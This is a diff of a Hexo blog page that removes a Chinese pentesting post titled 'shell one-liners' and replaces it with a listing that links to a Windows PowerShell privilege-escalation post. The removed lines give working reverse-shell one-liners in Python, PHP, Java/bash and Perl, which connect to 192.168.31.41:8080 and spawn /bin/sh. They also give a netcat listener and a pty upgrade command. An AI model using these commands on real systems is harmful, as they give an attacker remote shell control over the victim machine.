@@ -11,7 +11,7 @@
 
     <title>
         
-        shell一句话 - undefined
+        
         
     </title>
 
@@ -51,7 +51,7 @@
     </div>
     <div class="contents" id="nav-content">
         <ul>
-            <li>
+            <li class="active">
                 <a href="/">
                     <i class="iconfont icon-shouye1"></i>
                     <span>HOME</span>
@@ -86,10 +86,6 @@
         </ul>
     </div>
     
-        <div id="toc" class="toc-article">
-    
-</div>
-    
 </div>
 
 
@@ -113,53 +109,37 @@
     <div class="index-middle">
         <!-- Main Content -->
         
-
-
-<div class="post-container">
-    <div class="post-title">
-        shell一句话
-    </div>
-
-    <div class="post-meta">
-        <span class="attr">Post：<span>2019-03-06 01:19:41</span></span>
-        
-        <span class="attr">Tags：/
-        
-        <a class="tag" href="/tags/#shell" title="shell">shell</a>
-        <span>/</span>
-        
-        
-        </span>
-        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
-</span>
-
-    </div>
-    <div class="post-content ">
-        <p>###python脚本反弹<br>    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
-<p>###php 脚本反弹<br>    php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
-<p>###Java 脚本反弹<br>    r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()</p>
-<p>###perl 脚本反弹<br>    perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<p>###NC 监听一句话<br>    nc -v -l -v -p 8080</p>
-<p>#####NC 无法使用su命令解决办法：<br>    python -c ‘import pty; pty.spawn(“/bin/sh”)’</p>
-<p>python脚本反弹</p>
-<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’<br>php 脚本反弹</p>
-<p>php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’<br>Java 脚本反弹</p>
-<p>r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()<br>perl 脚本反弹</p>
-<p>perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>NC 监听一句话</p>
-<p>nc -v -l -v -p 8080<br>NC 无法使用su命令解决办法：</p>
-<p>python -c ‘import pty; pty.spawn(“/bin/sh”)’</p>
-
-        
-        <br>
-        <div id="comment-container">
+<div class="post-preview-container" style="min-height: 720px">
+    
+    <div class="post-preview">
+        <div class="post-time">2019-02-18</div>
+        <div class="post-info">
+            <a href="/2019/02/18/windows渗透之powershell提权/">
+                <h3>
+                    windows渗透之powershell提权
+                </h3>
+            </a>
+            <p>
+                
+                <span>/</span>
+                
+                <a class="tag" href="/tags/#windows提权" title="windows提权">windows提权</a>
+                <span>/</span>
+                
+                
+            </p>
         </div>
-        <div id="disqus_thread"></div>
-
-        <div id="lv-container">
-        </div>
-
     </div>
+    
 </div>
+<ul class="pager">
+    
+    <li class="previous">
+        <a href="/">&larr; Newer Posts</a>
+    </li>
+    
+    
+</ul>
 
     </div>
 </div>
@@ -199,7 +179,7 @@
     // We expose some of the variables needed by the front end
     window.hexo_search_path = "search.xml"
     window.hexo_root = "/"
-    window.isPost = true
+    window.isPost = false
 </script>
 <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
 <script src="/js/index.js"></script>
